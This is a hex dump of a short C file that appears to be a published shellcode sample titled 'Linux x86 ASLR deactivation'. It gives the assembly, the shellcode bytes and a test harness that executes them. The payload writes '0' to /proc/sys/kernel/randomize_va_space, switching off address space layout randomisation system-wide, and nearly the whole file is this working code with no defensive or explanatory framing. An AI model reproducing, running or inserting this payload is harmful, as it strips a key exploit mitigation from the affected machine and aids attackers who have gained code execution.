00000000  2f 2a 0d 0a 54 69 74 6c  65 3a 09 4c 69 6e 75 78  |/*..Title:.Linux|
00000010  20 78 38 36 20 41 53 4c  52 20 64 65 61 63 74 69  | x86 ASLR deacti|
00000020  76 61 74 69 6f 6e 20 2d  20 38 33 20 62 79 74 65  |vation - 83 byte|
00000030  73 0d 0a 41 75 74 68 6f  72 3a 09 4a 65 61 6e 20  |s..Author:.Jean |
00000040  50 61 73 63 61 6c 20 50  65 72 65 69 72 61 20 3c  |Pascal Pereira <|
00000050  70 65 72 65 69 72 61 40  73 65 63 62 69 7a 2e 64  |pereira@secbiz.d|
00000060  65 3e 0d 0a 57 65 62 3a  09 68 74 74 70 3a 2f 2f  |e>..Web:.http://|
00000070  30 78 66 66 65 34 2e 6f  72 67 0d 0a 0d 0a 0d 0a  |0xffe4.org......|
00000080  44 69 73 61 73 73 65 6d  62 6c 79 20 6f 66 20 73  |Disassembly of s|
00000090  65 63 74 69 6f 6e 20 2e  74 65 78 74 3a 0d 0a 0d  |ection .text:...|
000000a0  0a 30 38 30 34 38 30 36  30 20 3c 5f 73 74 61 72  |.08048060 <_star|
000000b0  74 3e 3a 0d 0a 20 38 30  34 38 30 36 30 3a 20 20  |t>:.. 8048060:  |
000000c0  20 20 20 20 20 33 31 20  63 30 20 20 20 20 20 20  |     31 c0      |
000000d0  20 20 20 20 20 20 20 20  20 20 20 20 20 78 6f 72  |             xor|
000000e0  20 20 20 20 25 65 61 78  2c 25 65 61 78 0d 0a 20  |    %eax,%eax.. |
000000f0  38 30 34 38 30 36 32 3a  20 20 20 20 20 20 20 35  |8048062:       5|
00000100  30 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0               |
00000110  20 20 20 20 20 20 20 70  75 73 68 20 20 20 25 65  |       push   %e|
00000120  61 78 0d 0a 20 38 30 34  38 30 36 33 3a 20 20 20  |ax.. 8048063:   |
00000130  20 20 20 20 36 38 20 37  30 20 36 31 20 36 33 20  |    68 70 61 63 |
00000140  36 35 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |65          push|
00000150  20 20 20 24 30 78 36 35  36 33 36 31 37 30 0d 0a  |   $0x65636170..|
00000160  20 38 30 34 38 30 36 38  3a 20 20 20 20 20 20 20  | 8048068:       |
00000170  36 38 20 37 36 20 36 31  20 35 66 20 37 33 20 20  |68 76 61 5f 73  |
00000180  20 20 20 20 20 20 20 20  70 75 73 68 20 20 20 24  |        push   $|
00000190  30 78 37 33 35 66 36 31  37 36 0d 0a 20 38 30 34  |0x735f6176.. 804|
000001a0  38 30 36 64 3a 20 20 20  20 20 20 20 36 38 20 36  |806d:       68 6|
000001b0  39 20 37 61 20 36 35 20  35 66 20 20 20 20 20 20  |9 7a 65 5f      |
000001c0  20 20 20 20 70 75 73 68  20 20 20 24 30 78 35 66  |    push   $0x5f|
000001d0  36 35 37 61 36 39 0d 0a  20 38 30 34 38 30 37 32  |657a69.. 8048072|
000001e0  3a 20 20 20 20 20 20 20  36 38 20 36 65 20 36 34  |:       68 6e 64|
000001f0  20 36 66 20 36 64 20 20  20 20 20 20 20 20 20 20  | 6f 6d          |
00000200  70 75 73 68 20 20 20 24  30 78 36 64 36 66 36 34  |push   $0x6d6f64|
00000210  36 65 0d 0a 20 38 30 34  38 30 37 37 3a 20 20 20  |6e.. 8048077:   |
00000220  20 20 20 20 36 38 20 36  63 20 32 66 20 37 32 20  |    68 6c 2f 72 |
00000230  36 31 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |61          push|
00000240  20 20 20 24 30 78 36 31  37 32 32 66 36 63 0d 0a  |   $0x61722f6c..|
00000250  20 38 30 34 38 30 37 63  3a 20 20 20 20 20 20 20  | 804807c:       |
00000260  36 38 20 36 35 20 37 32  20 36 65 20 36 35 20 20  |68 65 72 6e 65  |
00000270  20 20 20 20 20 20 20 20  70 75 73 68 20 20 20 24  |        push   $|
00000280  30 78 36 35 36 65 37 32  36 35 0d 0a 20 38 30 34  |0x656e7265.. 804|
00000290  38 30 38 31 3a 20 20 20  20 20 20 20 36 38 20 37  |8081:       68 7|
000002a0  39 20 37 33 20 32 66 20  36 62 20 20 20 20 20 20  |9 73 2f 6b      |
000002b0  20 20 20 20 70 75 73 68  20 20 20 24 30 78 36 62  |    push   $0x6b|
000002c0  32 66 37 33 37 39 0d 0a  20 38 30 34 38 30 38 36  |2f7379.. 8048086|
000002d0  3a 20 20 20 20 20 20 20  36 38 20 36 66 20 36 33  |:       68 6f 63|
000002e0  20 32 66 20 37 33 20 20  20 20 20 20 20 20 20 20  | 2f 73          |
000002f0  70 75 73 68 20 20 20 24  30 78 37 33 32 66 36 33  |push   $0x732f63|
00000300  36 66 0d 0a 20 38 30 34  38 30 38 62 3a 20 20 20  |6f.. 804808b:   |
00000310  20 20 20 20 36 38 20 32  66 20 32 66 20 37 30 20  |    68 2f 2f 70 |
00000320  37 32 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |72          push|
00000330  20 20 20 24 30 78 37 32  37 30 32 66 32 66 0d 0a  |   $0x72702f2f..|
00000340  20 38 30 34 38 30 39 30  3a 20 20 20 20 20 20 20  | 8048090:       |
00000350  38 39 20 65 33 20 20 20  20 20 20 20 20 20 20 20  |89 e3           |
00000360  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 25  |        mov    %|
00000370  65 73 70 2c 25 65 62 78  0d 0a 20 38 30 34 38 30  |esp,%ebx.. 80480|
00000380  39 32 3a 20 20 20 20 20  20 20 36 36 20 62 39 20  |92:       66 b9 |
00000390  62 63 20 30 32 20 20 20  20 20 20 20 20 20 20 20  |bc 02           |
000003a0  20 20 6d 6f 76 20 20 20  20 24 30 78 32 62 63 2c  |  mov    $0x2bc,|
000003b0  25 63 78 0d 0a 20 38 30  34 38 30 39 36 3a 20 20  |%cx.. 8048096:  |
000003c0  20 20 20 20 20 62 30 20  30 38 20 20 20 20 20 20  |     b0 08      |
000003d0  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
000003e0  20 20 20 20 24 30 78 38  2c 25 61 6c 0d 0a 20 38  |    $0x8,%al.. 8|
000003f0  30 34 38 30 39 38 3a 20  20 20 20 20 20 20 63 64  |048098:       cd|
00000400  20 38 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | 80             |
00000410  20 20 20 20 20 20 69 6e  74 20 20 20 20 24 30 78  |      int    $0x|
00000420  38 30 0d 0a 20 38 30 34  38 30 39 61 3a 20 20 20  |80.. 804809a:   |
00000430  20 20 20 20 38 39 20 63  33 20 20 20 20 20 20 20  |    89 c3       |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
00000450  20 20 20 25 65 61 78 2c  25 65 62 78 0d 0a 20 38  |   %eax,%ebx.. 8|
00000460  30 34 38 30 39 63 3a 20  20 20 20 20 20 20 35 30  |04809c:       50|
00000470  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000480  20 20 20 20 20 20 70 75  73 68 20 20 20 25 65 61  |      push   %ea|
00000490  78 0d 0a 20 38 30 34 38  30 39 64 3a 20 20 20 20  |x.. 804809d:    |
000004a0  20 20 20 36 36 20 62 61  20 33 30 20 33 61 20 20  |   66 ba 30 3a  |
000004b0  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |           mov  |
000004c0  20 20 24 30 78 33 61 33  30 2c 25 64 78 0d 0a 20  |  $0x3a30,%dx.. |
000004d0  38 30 34 38 30 61 31 3a  20 20 20 20 20 20 20 36  |80480a1:       6|
000004e0  36 20 35 32 20 20 20 20  20 20 20 20 20 20 20 20  |6 52            |
000004f0  20 20 20 20 20 20 20 70  75 73 68 20 20 20 25 64  |       push   %d|
00000500  78 0d 0a 20 38 30 34 38  30 61 33 3a 20 20 20 20  |x.. 80480a3:    |
00000510  20 20 20 38 39 20 65 31  20 20 20 20 20 20 20 20  |   89 e1        |
00000520  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |           mov  |
00000530  20 20 25 65 73 70 2c 25  65 63 78 0d 0a 20 38 30  |  %esp,%ecx.. 80|
00000540  34 38 30 61 35 3a 20 20  20 20 20 20 20 33 31 20  |480a5:       31 |
00000550  64 32 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |d2              |
00000560  20 20 20 20 20 78 6f 72  20 20 20 20 25 65 64 78  |     xor    %edx|
00000570  2c 25 65 64 78 0d 0a 20  38 30 34 38 30 61 37 3a  |,%edx.. 80480a7:|
00000580  20 20 20 20 20 20 20 34  32 20 20 20 20 20 20 20  |       42       |
00000590  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 69  |               i|
000005a0  6e 63 20 20 20 20 25 65  64 78 0d 0a 20 38 30 34  |nc    %edx.. 804|
000005b0  38 30 61 38 3a 20 20 20  20 20 20 20 62 30 20 30  |80a8:       b0 0|
000005c0  34 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |4               |
000005d0  20 20 20 20 6d 6f 76 20  20 20 20 24 30 78 34 2c  |    mov    $0x4,|
000005e0  25 61 6c 0d 0a 20 38 30  34 38 30 61 61 3a 20 20  |%al.. 80480aa:  |
000005f0  20 20 20 20 20 63 64 20  38 30 20 20 20 20 20 20  |     cd 80      |
00000600  20 20 20 20 20 20 20 20  20 20 20 20 20 69 6e 74  |             int|
00000610  20 20 20 20 24 30 78 38  30 0d 0a 20 38 30 34 38  |    $0x80.. 8048|
00000620  30 61 63 3a 20 20 20 20  20 20 20 62 30 20 30 36  |0ac:       b0 06|
00000630  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000640  20 20 20 6d 6f 76 20 20  20 20 24 30 78 36 2c 25  |   mov    $0x6,%|
00000650  61 6c 0d 0a 20 38 30 34  38 30 61 65 3a 20 20 20  |al.. 80480ae:   |
00000660  20 20 20 20 63 64 20 38  30 20 20 20 20 20 20 20  |    cd 80       |
00000670  20 20 20 20 20 20 20 20  20 20 20 20 69 6e 74 20  |            int |
00000680  20 20 20 24 30 78 38 30  0d 0a 20 38 30 34 38 30  |   $0x80.. 80480|
00000690  62 30 3a 20 20 20 20 20  20 20 34 30 20 20 20 20  |b0:       40    |
000006a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006b0  20 20 69 6e 63 20 20 20  20 25 65 61 78 0d 0a 20  |  inc    %eax.. |
000006c0  38 30 34 38 30 62 31 3a  20 20 20 20 20 20 20 63  |80480b1:       c|
000006d0  64 20 38 30 20 20 20 20  20 20 20 20 20 20 20 20  |d 80            |
000006e0  20 20 20 20 20 20 20 69  6e 74 20 20 20 20 24 30  |       int    $0|
000006f0  78 38 30 0d 0a 0d 0a 0d  0a 0d 0a 2a 2f 0d 0a 0d  |x80........*/...|
00000700  0a 23 69 6e 63 6c 75 64  65 20 3c 73 74 64 69 6f  |.#include <stdio|
00000710  2e 68 3e 0d 0a 0d 0a 63  68 61 72 20 73 68 65 6c  |.h>....char shel|
00000720  6c 63 6f 64 65 5b 5d 20  3d 20 22 5c 78 33 31 5c  |lcode[] = "\x31\|
00000730  78 63 30 5c 78 35 30 5c  78 36 38 5c 78 37 30 5c  |xc0\x50\x68\x70\|
00000740  78 36 31 5c 78 36 33 5c  78 36 35 5c 78 36 38 5c  |x61\x63\x65\x68\|
00000750  78 37 36 5c 78 36 31 5c  78 35 66 5c 78 37 33 5c  |x76\x61\x5f\x73\|
00000760  78 36 38 22 0d 0a 20 20  20 20 20 20 20 20 20 20  |x68"..          |
00000770  20 20 20 20 20 20 20 20  20 22 5c 78 36 39 5c 78  |         "\x69\x|
00000780  37 61 5c 78 36 35 5c 78  35 66 5c 78 36 38 5c 78  |7a\x65\x5f\x68\x|
00000790  36 65 5c 78 36 34 5c 78  36 66 5c 78 36 64 5c 78  |6e\x64\x6f\x6d\x|
000007a0  36 38 5c 78 36 63 5c 78  32 66 5c 78 37 32 5c 78  |68\x6c\x2f\x72\x|
000007b0  36 31 22 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |61"..           |
000007c0  20 20 20 20 20 20 20 20  22 5c 78 36 38 5c 78 36  |        "\x68\x6|
000007d0  35 5c 78 37 32 5c 78 36  65 5c 78 36 35 5c 78 36  |5\x72\x6e\x65\x6|
000007e0  38 5c 78 37 39 5c 78 37  33 5c 78 32 66 5c 78 36  |8\x79\x73\x2f\x6|
000007f0  62 5c 78 36 38 5c 78 36  66 5c 78 36 33 5c 78 32  |b\x68\x6f\x63\x2|
00000800  66 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |f"..            |
00000810  20 20 20 20 20 20 20 22  5c 78 37 33 5c 78 36 38  |       "\x73\x68|
00000820  5c 78 32 66 5c 78 32 66  5c 78 37 30 5c 78 37 32  |\x2f\x2f\x70\x72|
00000830  5c 78 38 39 5c 78 65 33  5c 78 36 36 5c 78 62 39  |\x89\xe3\x66\xb9|
00000840  5c 78 62 63 5c 78 30 32  5c 78 62 30 5c 78 30 38  |\xbc\x02\xb0\x08|
00000850  22 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |"..             |
00000860  20 20 20 20 20 20 22 5c  78 63 64 5c 78 38 30 5c  |      "\xcd\x80\|
00000870  78 38 39 5c 78 63 33 5c  78 35 30 5c 78 36 36 5c  |x89\xc3\x50\x66\|
00000880  78 62 61 5c 78 33 30 5c  78 33 61 5c 78 36 36 5c  |xba\x30\x3a\x66\|
00000890  78 35 32 5c 78 38 39 5c  78 65 31 5c 78 33 31 22  |x52\x89\xe1\x31"|
000008a0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
000008b0  20 20 20 20 20 22 5c 78  64 32 5c 78 34 32 5c 78  |     "\xd2\x42\x|
000008c0  62 30 5c 78 30 34 5c 78  63 64 5c 78 38 30 5c 78  |b0\x04\xcd\x80\x|
000008d0  62 30 5c 78 30 36 5c 78  63 64 5c 78 38 30 5c 78  |b0\x06\xcd\x80\x|
000008e0  34 30 5c 78 63 64 5c 78  38 30 22 3b 0d 0a 0d 0a  |40\xcd\x80";....|
000008f0  0d 0a 69 6e 74 20 6d 61  69 6e 28 29 0d 0a 7b 0d  |..int main()..{.|
00000900  0a 20 20 66 70 72 69 6e  74 66 28 73 74 64 6f 75  |.  fprintf(stdou|
00000910  74 2c 22 4c 65 6e 67 68  74 3a 20 25 64 5c 6e 22  |t,"Lenght: %d\n"|
00000920  2c 73 74 72 6c 65 6e 28  73 68 65 6c 6c 63 6f 64  |,strlen(shellcod|
00000930  65 29 29 3b 0d 0a 20 20  28 2a 28 76 6f 69 64 20  |e));..  (*(void |
00000940  20 28 2a 29 28 29 29 20  73 68 65 6c 6c 63 6f 64  | (*)()) shellcod|
00000950  65 29 28 29 3b 0d 0a 7d                           |e)();..}|
00000958
